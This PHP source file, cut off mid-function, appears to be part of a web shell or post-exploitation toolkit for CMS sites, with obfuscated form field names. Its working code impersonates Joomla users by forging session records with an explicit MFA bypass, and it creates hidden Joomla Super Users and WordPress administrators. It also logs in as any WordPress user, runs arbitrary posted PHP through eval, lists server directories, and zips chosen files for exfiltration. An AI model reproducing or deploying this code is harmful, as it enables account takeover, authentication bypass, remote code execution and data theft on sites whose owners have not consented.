
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeCheckDrupalRolesPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $roles        = NgetDrupalRoles();
    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeTable(
                "Roles",
                "Drupal roles and their permissions",
                $roles,
                array(
                    "role"        => "Role",
                    "permissions" => "Permissions",
                )
            ),
        )
    );
}

/**
 * Get the list of Drupal roles
 *
 * @return array
 */
function NgetDrupalRoles() {
    if (!class_exists('\Drupal\user\Entity\Role')) {
        return array();
    }

    $roles       = \Drupal\user\Entity\Role::loadMultiple();
    $permissions = \Drupal::service('user.permissions')
        ->getPermissions();

    $result = array();

    foreach ($roles as $role) {
        $role_permissions = array();

        foreach ($permissions as $permission => $permission_info) {
            if ($role->hasPermission($permission)) {
                $role_permissions[] = "<li>" . htmlentities($permission_info['title']) . "</li>";
            }
        }

        $result[] = array(
            "id"          => $role->id(),
            "role"        => $role->label(),
            "permissions" => "<ul class='list-disc list-inside'>" . implode("", $role_permissions) . "</ul>",
        );
    }

    return $result;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NcheckDrupalRolesHooksFeatures(&$features) {
    global $CHECK_DRUPAL_USER_ROLES;

    $features[] = array(
        "title"       => "List Drupal roles",
        "description" => "List all Drupal roles and their permissions.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 10.5V6.75a4.5 4.5 0 1 1 9 0v3.75M3.75 21.75h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H3.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z" />
</svg>',
        "op"          => $CHECK_DRUPAL_USER_ROLES,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeJoomlaImpersonatePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $users = NgetJoomlaUsers();

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeTable(
                "Users",
                "Joomla users to impersonate",
                $users,
                array(
                    "id"       => "Id",
                    "username" => "Username",
                    "email"    => "Email",
                    "title"    => "Role",
                    "actions"  => "Actions",
                ),
                "
                        <dialog id='create-joomla-user' class='p-4 rounded w-1/3'>" .
                NmakeForm(
                    $page,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create Joomla user</h3>
                                        <button onclick='document.getElementById(\"create-joomla-user\").close(); document.getElementById(\"create-joomla-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>",
                        NmakeInput(
                            "text",
                            "Username",
                            "x45",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        NmakeInput(
                            "text",
                            "Email",
                            "O29",
                            "admin@example.com",
                            "Email of the user to create.",
                            true
                        ),
                        NmakeInput(
                            "password",
                            "Password",
                            "t14",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-joomla-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
            ),
        )
    );
}

/**
 * Create a Joomla user table row
 *
 * @param $data array{id: int, username: string, email: string, title: string} The data of the Joomla user
 *
 * @return array{id: int, username: string, email: string, title: string, actions: string} The Joomla user table row
 */
function NmakeJoomlaUserTableRow($data) {
    global $IMPERSONATE_JOOMLA_USER;
    return array_merge(
        $data,
        array(
            "actions" => NmakeForm(
                $IMPERSONATE_JOOMLA_USER,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "hidden",
                        "Username",
                        "c69",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        htmlentities($data["username"])
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            ),
        )
    );
}

/**
 * Get the list of Joomla users
 *
 * @return array{id: int, username: string, email: string, title: string}[] List of Joomla users
 */
function NgetJoomlaUsers() {
    if (!class_exists("Joomla\CMS\Factory")) {
        return array();
    }

    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    $db        = $container->get("Joomla\Database\DatabaseInterface");

    // create a new query object to retrieve user details along with group names
    $query = $db->getQuery(true);

    // build the query to retrieve user details and group names
    $query->select(array('u.id', 'u.username', 'u.email', 'g.title'));
    $query->from($db->quoteName('#__users', 'u'));
    $query->leftJoin($db->quoteName('#__user_usergroup_map', 'm') . ' ON u.id = m.user_id');
    $query->leftJoin($db->quoteName('#__usergroups', 'g') . ' ON m.group_id = g.id');

    // set the query conditions to retrieve only activated users:
    // $query->where('u.block = 0');

    // execute the query
    $db->setQuery($query);

    return array_map(
        "NmakeJoomlaUserTableRow",
        $db->loadAssocList()
    );
}

/**
 * Handle the redirect of Joomla to the administration panel
 *
 * @return void
 */
function NredirectJoomlaToAdminPanel() {
    if (!class_exists("JUri")) // Get the base URL of the Joomla site
    {
        $baseUrl = JUri::base();
    }

    // Construct the URL to the administration panel
    $adminUrl = $baseUrl . '../../../administrator/index.php';

    // Redirect to the administration panel
    JFactory::getApplication()
        ->redirect($adminUrl);
}

/**
 * Impersonate a Joomla user given a username
 *
 * @param $username string The username of the user to impersonate
 *
 * @return void
 */
function NimpersonateJoomlaUser($username) {
    if (!class_exists("Joomla\CMS\Factory") || !class_exists("Joomla\Registry\Registry")) {
        return;
    }
    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $db
     */
    $db = $container->get("Joomla\Database\DatabaseInterface");

    // Get the user ID by username
    $query = $db->getQuery(true)
        ->select('id')
        ->from('#__users')
        ->where('username = :username')
        ->bind(':username', $username);

    $db->setQuery($query);
    $result = $db->loadResult();

    // Get the user object by id
    $user = $container->get("Joomla\CMS\User\UserFactoryInterface")
        ->loadUserById($result);

    // create a new registry object to store the session data
    $registry = new \Joomla\Registry\Registry();

    // the registry must contain a session object (stdClass)
    $session               = new \stdClass();
    $session->token        = session_id();
    $session->counter      = 5;
    $session->timer        = new \stdClass();
    $session->timer->start = time();
    $session->timer->now   = time();
    $session->timer->last  = time() + 60 * 60 * 24; // 24 hours
    // add the session object to the registry
    $registry->set("session", $session);

    // the registry must contain another registry object (i don't know why yet...)
    $internal_registry = new \Joomla\Registry\Registry();
    $registry->set("registry", $internal_registry);

    // the registry must contain a user object (a full user object directly retrieved from the database)
    $registry->set("user", $user);

    // if the user has MFA enabled, we need to bypass it, this should do the trick
    $mfa_bypass              = new \stdClass();
    $mfa_bypass->mfa_checked = 1;
    $registry->set("com_users", $mfa_bypass);

    // serialize the registry object and encode it in base64
    $serializable_session = base64_encode(serialize($registry));
    // then serialized the previous object and prepend it with the "joomla|" prefix
    $serialized_session = "joomla|" . serialize($serializable_session);

    // update the session data in the database
    $client_id = 1;
    $guest     = 0;
    $query     = $db->getQuery(true)
        ->update('#__session')
        ->set('data = :data')
        ->set('client_id = :client_id')
        ->set('guest = :guest')
        ->set('time = :time')
        ->set('userid = :uid')
        ->where('session_id = :session_id')
        ->bind(':data', $serialized_session)
        ->bind(':time', $session->timer->now)
        ->bind(':uid', $user->id)
        ->bind(':client_id', $client_id)
        ->bind(':guest', $guest)
        ->bind(":session_id", $session->token);
    $db->setQuery($query);
    $db->execute();

    // redirect to the admin panel (if located at the default path)
    NredirectJoomlaToAdminPanel();
}

/**
 * Add a Joomla super user
 *
 * @param $username string The username of the super user
 * @param $email string The email of the super user
 * @param $password string The password of the super user
 *
 * @return void
 */
function NaddJoomlaSuperUser($username, $email, $password) {
    if (!class_exists("Joomla\CMS\Factory") || !class_exists("JUserHelper")) {
        return;
    }

    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $db
     */
    $db = $container->get("Joomla\Database\DatabaseInterface");

    // Query to retrieve the group ID for Super Users
    $query = $db->getQuery(true)
        ->select($db->quoteName('id'))
        ->from($db->quoteName('#__usergroups'))
        ->where($db->quoteName('title') . ' = ' . $db->quote('Super Users'));

    // Execute the query
    $db->setQuery($query);
    $groupId = $db->loadResult();

    // hash the password
    $password = JUserHelper::hashPassword($password);

    // Insert the user into the #__users table
    $query = $db->getQuery(true)
        ->insert($db->quoteName('#__users'))
        ->columns(
            array(
                $db->quoteName('name'),
                $db->quoteName('username'),
                $db->quoteName('email'),
                $db->quoteName('password'),
                $db->quoteName('params'),
                $db->quoteName('registerDate'),
                $db->quoteName('lastvisitDate'),
                $db->quoteName('lastResetTime'),
            )
        )
        ->values(
            $db->quote($username) .
            ', ' .
            $db->quote($username) .
            ', ' .
            $db->quote($email) .
            ', ' .
            $db->quote($password) .
            ', "", NOW(), NOW(), NOW()'
        );
    $db->setQuery($query);
    $db->execute();

    // Get the user ID of the newly inserted user
    $userId = $db->insertid();

    // Insert user-group mapping into #__user_usergroup_map table
    $query = $db->getQuery(true)
        ->insert($db->quoteName('#__user_usergroup_map'))
        ->columns(array($db->quoteName('user_id'), $db->quoteName('group_id')))
        ->values($userId . ', ' . $groupId);
    $db->setQuery($query);
    $db->execute();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleJoomlaImpersonate($operation, $features) {
    if (!empty($_POST["c69"])) {
        NimpersonateJoomlaUser($_POST["c69"]);
    }
    elseif (!empty($_POST["x45"]) &&
            !empty($_POST["O29"]) &&
            !empty($_POST["t14"])) {
        NaddJoomlaSuperUser($_POST["x45"], $_POST["O29"], $_POST["t14"]);

        header(
            "Location: " .
            $_SERVER["REQUEST_URI"],
            true,
            301
        );
        die;
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NjoomlaImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_JOOMLA_USER;

    $isolated_ops[] = $IMPERSONATE_JOOMLA_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NjoomlaImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_JOOMLA_USER;

    $features[] = array(
        "title"       => "Impersonate Joomla user",
        "description" => "Impersonate a Joomla user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $IMPERSONATE_JOOMLA_USER,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeWpImpersonatePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $users        = NgetWPUsers();
    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeTable(
                "Users",
                "WordPress users to impersonate",
                $users,
                array(
                    "user_login" => "Username",
                    "user_email" => "Email",
                    "roles"      => "Roles",
                    "user_url"   => "URL",
                    "actions"    => "Actions",
                ),
                "
                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
                NmakeForm(
                    $page,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>",
                        NmakeInput(
                            "text",
                            "Username",
                            "x45",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        NmakeInput(
                            "password",
                            "Password",
                            "O29",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleWpImpersonate($operation, $features) {
    // Run the impersonate operation
    if (!empty($_POST["c69"])) {
        if (!function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
            !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
            !function_exists("site_url")) {
            return;
        }

        $user = get_user_by("login", $_POST["c69"]);
        if ($user) {
            wp_set_current_user($user->ID, $user->user_login);
            wp_set_auth_cookie($user->ID);
            wp_redirect(site_url());
            die;
        }
    }
    // Run the user creation operation
    elseif (!empty($_POST["x45"]) &&
            !empty($_POST["O29"])) {
        if (!function_exists("wp_insert_user") || !function_exists("is_wp_error") ||
            !function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
            !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
            !function_exists("site_url")) {
            return;
        }

        // creates the admin user
        $user_id = wp_insert_user(
            array(
                "user_login" => "N" . $_POST["x45"],
                "user_pass"  => $_POST["O29"],
                "role"       => "administrator",
            )
        );

        // if the user was created successfully, log in
        if (!is_wp_error($user_id)) {
            $user = get_user_by("id", $user_id);
            if ($user) {
                wp_set_current_user($user->ID, $user->user_login);
                wp_set_auth_cookie($user->ID);
                wp_redirect(site_url());
                die;
            }
        }
    }
}

/**
 * Create the table row for the WordPress users
 *
 * @param $data WP_User The WordPress user data
 *
 * @return array The table row
 */
function NmakeWpUserTableRow($data) {
    global $IMPERSONATE_WP_USER;

    return array_merge(
        (array) $data->data,
        array(
            "roles"   => $data->roles,
            "actions" => NmakeForm(
                $IMPERSONATE_WP_USER,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "hidden",
                        "username",
                        "c69",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        htmlentities($data->data->user_login)
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            ),
        )
    );
}

/**
 * Get the list of WordPress users
 *
 * @return array List of WordPress users
 */
function NgetWPUsers() {
    if (!function_exists("get_users")) {
        return array();
    }

    return array_map(
        "NmakeWpUserTableRow",
        get_users()
    );
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NWpImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_WP_USER;

    $isolated_ops[] = $IMPERSONATE_WP_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NWpImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_WP_USER;

    $features[] = array(
        "title"       => "Impersonate WP user",
        "description" => "Impersonate a WordPress user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $IMPERSONATE_WP_USER,
    );
}


/**
 * Create the code evaluation page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeCodeEvaluationPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "textarea",
                        "PHP code",
                        "c69",
                        "echo 'Hello, world!';",
                        "The PHP code to evaluate.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the code evaluation operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleCodeEvaluation($operation, $features) {
    eval($_POST["c69"]);
}

/**
 * Hook the features to add the code evaluation feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NcodeEvalHooksFeatures(&$features) {
    global $EVAL;

    $features[] = array(
        "title"       => "Eval PHP",
        "description" => "Evaluate PHP code.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
</svg>',
        "op"          => $EVAL,
    );
}


/**
 * Create the login page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeDirectoryListingPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "text",
                        "Path",
                        "c69",
                        "C://path/to/directory or \\\\network\\path\\to\\directory",
                        "Fully qualified path to the directory to list.",
                        true
                    ),
                    NmakeInput(
                        "text",
                        "Depth",
                        "x45",
                        "5",
                        "How many levels deep to list, where " . NmakeCodeHighlight(0) .
                        " is the current directory and " . NmakeCodeHighlight("inf") .
                        " means to list all.",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the directory listing operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleDirectoryListing($operation, $features) {
    $max_depth = strtolower($_POST['x45']) === "inf" ? INF : intval($_POST['x45']);

    NlistFilesRecursive($_POST['c69'], $max_depth);
}

/**
 * Get the permissions string for a file or directory (unix like `ls -l` output)
 *
 * @param $path string Path to get permissions for
 *
 * @return string
 */
function NgetPermissionsString($path) {
    if (!file_exists($path)) {
        return "----------";
    }

    $perms = fileperms($path);

    // Determine file type
    $type = '';
    if (is_dir($path)) {
        $type = 'd';
    }
    elseif (is_file($path)) {
        $type = '-';
    }

    // Owner permissions
    $owner_perms = ($perms & 0x0100) ? 'r' : '-';
    $owner_perms .= ($perms & 0x0080) ? 'w' : '-';
    $owner_perms .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');

    // Group permissions
    $group_perms = ($perms & 0x0020) ? 'r' : '-';
    $group_perms .= ($perms & 0x0010) ? 'w' : '-';
    $group_perms .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');

    // Other permissions
    $other_perms = ($perms & 0x0004) ? 'r' : '-';
    $other_perms .= ($perms & 0x0002) ? 'w' : '-';
    $other_perms .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');

    return $type . $owner_perms . $group_perms . $other_perms;
}

/**
 * Get the stat for the current path and print information
 *
 * @param $path string Path to get stat for
 *
 * @return array
 */
function NgetStatForCurrentPath($path) {
    $stat = stat($path);

    // Print information for current path
    $perm = NgetPermissionsString($path);

    // Output `ls -lah` like format
    echo "$perm " .
         Npad_right("" . $stat["nlink"], 3) .
         " " .
         Npad_right("" . $stat["uid"], 5) . // always 0 on windows
         " " .
         Npad_right("" . $stat["gid"], 5) . // always 0 on windows
         " " .
         NformatBytes($stat["size"]) .
         " " .
         NconvertUnixTimestampToDate($stat["mtime"]) .
         " " . htmlentities($path) . PHP_EOL;

    return array($stat, $perm);
}

/**
 * List files recursively
 *
 * @param $path string Path to list
 * @param $max_depth int Maximum depth to list
 * @param $depth int Current depth
 * @param $show_line_split bool Whether to show a line split between entries
 *
 * @return void
 */
function NlistFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true) {
    // Get stat for current path
    NgetStatForCurrentPath($path);

    if ($show_line_split) {
        echo "----------------\n";
    }

    // Check if path is a directory and is readable
    if (is_dir($path) && is_readable($path)) {

        // Open directory handle
        $dir_handle = opendir($path);

        // Loop through directory contents
        while (($file = readdir($dir_handle)) !== false) {

            // Ignore '.' and '..'
            if ($file !== '.' && $file !== '..') {
                $sub_path = "$path/$file";

                // Recursively list files if depth is less than max depth
                if ($depth < $max_depth) {
                    NlistFilesRecursive($sub_path, $max_depth, $depth + 1, false);
                }
                else {
                    // Print information for files beyond max depth
                    NgetStatForCurrentPath($sub_path);
                }
            }
        }
        // Close directory handle
        closedir($dir_handle);
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NdirectoryListingHooksFeatures(&$features) {
    global $DIRECTORY_LISTING;

    $features[] = array(
        "title"       => "Directory listing",
        "description" => "List all files and folders in a directory and optionally its subdirectories.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
</svg>',
        "op"          => $DIRECTORY_LISTING,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeExfiltratePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "textarea",
                        "Paths",
                        "c69",
                        "C://path/to/file1.txt\nC://path/to/file2.txt\nC://path/to/folder1\nC://path/to/folder2,with_tree\nC://path/to/folder3,with_tree,extensions=txt|doc|xlsx",
                        "List of file/folders to include in the zip archive.<br/>" .
                        "Concatenate to the path " . NmakeCodeHighlight(",with_tree") .
                        " to include all files and folders within a given directory.<br/>" .
                        "Concatenate to the path " . NmakeCodeHighlight(",extensions=txt|doc|xlsx") .
                        " to include only files with the given extensions.",
                        true
                    ),
                )
            ),
            // if a request with the status parameter is received create the command output screen and render the status
            empty($_GET["status"])
                ? ""
                : NopenCommandOutputScreen(true) .
                  htmlentities($_GET["status"]) .
                  NcloseCommandOutputScreen(true),
        )
    );
}

/**
 * Get the shortest common path from a list of paths
 *
 * @param $paths string[] List of paths
 *
 * @return string|null
 */
function NgetShortestCommonPath($paths) {
    if (empty($paths)) {
        return null;
    }

    // Initialize with first path
    $shortest_path = $paths[0];

    foreach ($paths as $path) {
        $common_path       = '';
        $path_segments     = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); // Split path by separator
        $shortest_segments = explode(DIRECTORY_SEPARATOR, trim($shortest_path, DIRECTORY_SEPARATOR));

        $min_length = min(count($path_segments), count($shortest_segments));
        for ($i = 0; $i < $min_length; $i++) {
            if ($path_segments[$i] === $shortest_segments[$i]) {
                $common_path .= $path_segments[$i] . DIRECTORY_SEPARATOR;
            }
            else {
                break;
            }
        }

        // Update shortest path if shorter common path found
        $shortest_path = $common_path;
    }

    // Remove trailing separator if present
    return rtrim($shortest_path, DIRECTORY_SEPARATOR);
}

/**
 * Add a directory to a zip archive
 *
 * @param $dir string Directory to add
 * @param $zip ZipArchive Zip archive to add to
 * @param $recursive bool Whether to add the directory recursively
 * @param $extensions string[] Extensions to include
 * @param $cleanup_path string Path to cleanup
 *
 * @return void
 */
function NaddDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = "") {
    $dir_handle = opendir($dir);

    while (($file = readdir($dir_handle)) !== false) {
        if ($file !== '.' && $file !== '..') {
            $sub_path = "$dir/$file";

            if (
                is_file($sub_path) &&
                ($extensions === array() || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
            ) {
                // Add with relative path within zip
                $zip->addFile(
                    $sub_path,
                    str_replace(
                        $cleanup_path,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($sub_path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            else {
                if ($recursive && is_dir($sub_path) && is_readable($sub_path)) {
                    NaddDirectoryToZip($sub_path, $zip, $recursive, $extensions, $cleanup_path);
                }
            }
        }
    }

    closedir($dir_handle);
}

/**
 * Handle the zip creation process
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleExfiltrate($operation, $features) {
    $content = $_POST['c69'];

    // ensure the zip extension is loaded
    if (!extension_loaded('zip')) {
        // redirect to the same page with the error status
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Zip extension is not loaded.")
        );
        return;
    }

    $zip      = new ZipArchive();
    $zip_name = tempnam(sys_get_temp_dir(), "cs>1G");

    // if the zip file cannot be opened fail
    if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        header(
            "Location: " . $_SERVER["REQUEST_URI"] .
            "&status=" .
            urlencode("Error: Could not create temporary archive.")
        );
        return;
    }

    $lines            = explode("\n", $content);
    $path_replacement = NgetShortestCommonPath($lines);

    // loop through the lines to extract
    foreach ($lines as $line) {
        // Split line by comma to extract options
        $parts = explode(',', trim($line));
        $path  = !empty($parts[0]) ? $parts[0] : '';

        // check if want to exfiltrate recursively
        $recursive  = in_array('with_tree', $parts);
        $extensions = array();

        // load the whitelisted extensions
        foreach ($parts as $part) {
            if (strpos($part, 'extension=') === 0) {
                $extensions = explode("|", strtolower(trim(substr($part, 10)))); // 10 = "extension=".length
                break;
            }
        }

        if ($path) {
            if (
                is_file($path) && // got a file
                // with a whitelisted extension (or extensions are not defined)
                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
            ) {
                // add the file to the zip archive
                $zip->addFile(
                    $path,
                    str_replace(
